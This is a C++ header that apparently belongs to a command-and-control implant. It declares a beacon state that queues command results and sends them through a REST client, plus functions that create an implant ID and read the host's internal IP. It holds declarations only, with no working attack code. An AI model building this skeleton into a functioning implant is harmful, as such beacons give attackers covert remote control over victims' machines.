#pragma once

#include "Beacon.hpp"
#include "CommandDAO.hpp"

#include <RESTClient.hpp>
#include <mutex>
#include <vector>

class BeaconState {
public:
    void add_result(CommandResult result);
    [[nodiscard]] std::vector<CommandResult> take_results();

    [[nodiscard]] std::vector<CommandDAO> send_beacon(cpppwn::RESTClient& rest_client);

private:
    std::mutex mtx_;
    std::vector<CommandResult> pending_results_;
};

[[nodiscard]] std::string get_or_create_implant_id();
[[nodiscard]] std::string get_internal_ip();
